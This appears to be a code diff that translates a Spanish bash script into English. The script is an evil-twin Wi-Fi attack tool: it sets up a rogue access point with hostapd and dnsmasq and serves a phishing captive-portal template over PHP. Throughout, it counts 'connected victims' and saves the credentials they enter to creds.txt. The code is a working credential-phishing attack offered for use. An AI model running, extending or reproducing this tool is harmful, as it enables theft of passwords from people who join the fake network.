@@ -2,75 +2,75 @@
 export TERM=xterm
 trap ctrl_c INT
 function ctrl_c(){
-	echo -e " Saliendo..."
+	echo -e " Exiting..."
 	./src/reset.sh ap
 	rm -r page/captive_portal/html_page
 
-	if [ -n "$(/bin/cat ./pages/$pagina/data.txt 2>&1)" ];then
+	if [ -n "$(/bin/cat ./pages/$template/data.txt 2>&1)" ];then
 		/bin/cat ./page/captive_portal/data.txt 2> /dev/null > creds.txt
 		rm ./page/captive_portal/data.txt
 	fi
 	exit 0
 }
 
-interfaz=$(/bin/cat ./content/interfaz)
-echo $interfaz
+interface=$(/bin/cat ./content/interface)
+echo $interface
 
-function configurar_interfaz(){
-	echo ". . . . Creando interfaz en modo AP"
+function configure_interface(){
+	echo ". . . . Creating interface in AP mode"
 	
-	iw dev $interfaz interface add ap0 type __ap > /dev/null
+	iw dev $interface interface add ap0 type __ap > /dev/null
 
 	ip addr add 10.10.0.1/24 dev ap0 > /dev/null
 	ip link set ap0 up > /dev/null
 	sleep 1
 	if ! ip link show ap0 > /dev/null 2>&1;then
-		echo "Error creando la interfaz"
+		echo "Error creating the interface"
 		exit 1
 	fi
 }
 
 
-##############################    datos    ########################################################
+##############################    data    ########################################################
 
-function datos_ap(){
+function ap_data(){
 	use_ssid=""
 	use_channel=""
-	indice_pagina=""
+	template_index=""
 	pass="a"
 	while [ -z "$use_ssid" ]; do
-		echo -ne "\nSSID de la red: " && read -r use_ssid
+		echo -ne "\nNetwork SSID: " && read -r use_ssid
 	done
 
 	while [ -z "$use_channel" ] || [ "$use_channel" -lt 1 ] || [ "$use_channel" -gt 12 ]; do
-		echo -ne "\nEspecifique un canal (1-12): " && read -r use_channel
+		echo -ne "\nSpecify a channel (1-12): " && read -r use_channel
 	done
 
 	while [ -n "$pass" ] && { [ "${#pass}" -lt 8 ] || [ "${#pass}" -gt 63 ]; }; do
-		echo -ne "\nEspecifique la contraseña (8:63 chars): " && read -r pass
+		echo -ne "\nSpecify the password (8:63 chars): " && read -r pass
 	done
 
-	paginas=()
+	templates=()
 	for dir in page/templates/*/; do
-		[ -d "$dir" ] && paginas+=("$(basename "$dir")")
+		[ -d "$dir" ] && templates+=("$(basename "$dir")")
 	done
 
-	echo -ne "\n====Plantillas Disponibles====\n"
-	for i in "${!paginas[@]}"; do
-		echo -ne "$i: ${paginas[$i]}\n"
+	echo -ne "\n====Available Templates====\n"
+	for i in "${!templates[@]}"; do
+		echo -ne "$i: ${templates[$i]}\n"
 	done
 
-	while [ -z "$indice_pagina" ] || [ "$indice_pagina" -ge "${#paginas[@]}" ] || [ "$indice_pagina" -lt 0 ]; do
-		echo -ne "\nPlantilla para el portal cautivo: " && read -r indice_pagina
+	while [ -z "$template_index" ] || [ "$template_index" -ge "${#templates[@]}" ] || [ "$template_index" -lt 0 ]; do
+		echo -ne "\nTemplate for the captive portal: " && read -r template_index
 	done
-	pagina=${paginas[$indice_pagina]}
+	template=${templates[$template_index]}
 }
 
-##############################    Ataque    ##########################################
+##############################    Attack    ##########################################
 
 function start_ap(){
-	echo -e "\n\nCreando el ap"
-	echo -e "\n. . . . Matando los procesos que puedan interferir"
+	echo -e "\n\nCreating the AP"
+	echo -e "\n. . . . Killing processes that may interfere"
 	sleep 1
 
 # -- setup --
@@ -84,7 +84,7 @@ function start_ap(){
 	pkill hostapd >/dev/null 2>&1
 
 # -- config --
-	echo -e ". . . . Configurando hostapd"
+	echo -e ". . . . Configuring hostapd"
 
 /bin/cat > content/hostapd.conf << EOF
 interface=ap0
@@ -101,7 +101,7 @@ if [ "$pass" != "" ]; then
 fi
 
 	
-	echo -e ". . . . Configurando dnsmasq"
+	echo -e ". . . . Configuring dnsmasq"
 
 /bin/cat > content/dnsmasq.conf << EOF
 interface=ap0
@@ -113,47 +113,47 @@ dhcp-authoritative
 EOF
 
 # -- start --
-	configurar_interfaz
+	configure_interface
 
 	hostapd content/hostapd.conf > /dev/null &
 	sleep 3
 	dnsmasq -C content/dnsmasq.conf > /dev/null
 
-	echo -e "\nAp con nombre $use_ssid creado\n"
+	echo -e "\nAP named $use_ssid created\n"
 	sleep 1
 }
 
 function hosts_connect(){
 	activehosts=0
-	datoscap=""
+	captured_data=""
 	while true;do
 		clear
 		echo -e "\n----------------------------------------------------------"
-		echo -e "\nVictimas conectadas: $activehosts\n"
-		echo -e "\nDatos capturados: $datoscap\n"
+		echo -e "\nConnected victims: $activehosts\n"
+		echo -e "\nCaptured data: $captured_data\n"
 		echo -e "----------------------------------------------------------"
 		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "10.10.0.1 " | wc -l 2> /dev/null)
-		datoscap=$(/bin/cat ./page/captive_portal/data.txt 2>/dev/null)
+		captured_data=$(/bin/cat ./page/captive_portal/data.txt 2>/dev/null)
 		sleep 2
 	done
 
 }
 
 function portal(){
-	echo -e ". . . . Configurando portal cautivo"
+	echo -e ". . . . Configuring captive portal"
 	sleep 0.5
 	pushd page/captive_portal > /dev/null 2>&1
 	rm -r html_page 2> /dev/null
-	cp -r ../templates/$pagina html_page/
+	cp -r ../templates/$template html_page/
 	php -S 10.10.0.1:80 > /dev/null 2>&1 &
 	sleep 1
 	popd > /dev/null 2>&1
 }
 
-################################    Inicio del programa    #############################
+################################    Program start    #############################
 
 clear
-datos_ap
+ap_data
 
 start_ap
 portal
